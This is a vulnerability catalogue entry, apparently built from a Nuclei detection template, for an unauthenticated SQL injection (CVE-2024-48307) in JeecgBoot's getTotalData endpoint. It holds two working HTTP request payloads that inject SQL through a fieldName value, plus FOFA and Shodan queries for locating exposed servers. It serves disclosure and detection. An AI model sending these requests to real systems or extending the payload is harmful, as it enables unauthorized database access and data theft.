---
layout: post
cve_id: CVE-2024-48307
title: JeecgBoot v3.7.1 - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-48307.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-48307.yaml
snort2_rule: N/A
snort3_rule: N/A
author: lbb,s4e-io
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary SQL commands to extract sensitive
  information from the JeecgBoot database.

  '
remediation: 'Update JeecgBoot to a version that patches CVE-2024-48307.

  '
reference:
- https://github.com/wy876/POC/blob/main/JeecgBoot/JeecgBoot%E6%8E%A5%E5%8F%A3getTotalData%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-48307).md
- https://github.com/jeecgboot/JeecgBoot/issues/7237
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-48307
  cwe-id: CWE-89
  epss-score: 0.92209
  epss-percentile: 0.997
metadata:
  max-request: 2
  vendor: jeecg
  product: jeecg_boot
  fofa-query:
  - icon_hash="-250963920"
  - icon_hash=1380908726
  - title="jeecg-boot"
  shodan-query: http.favicon.hash:"1380908726"
tags:
- cve2024
- cve
- jeecg
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
The JeecgBoot application is vulnerable to SQL Injection via the `getTotalData` endpoint. An attacker can exploit this vulnerability to extract sensitive information from the database by injecting SQL commands.


## üåê HTTP Request
```nohighlight
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Content-Length: 281
Content-Type: application/json
Accept-Encoding: gzip
{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(md5(3445),0x3a,0x3a)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
```

```nohighlight
POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/2008052906 Firefox/3.0
Content-Length: 281
Content-Type: application/json
Accept-Encoding: gzip
{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(md5(3445),0x3a,0x3a)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
```

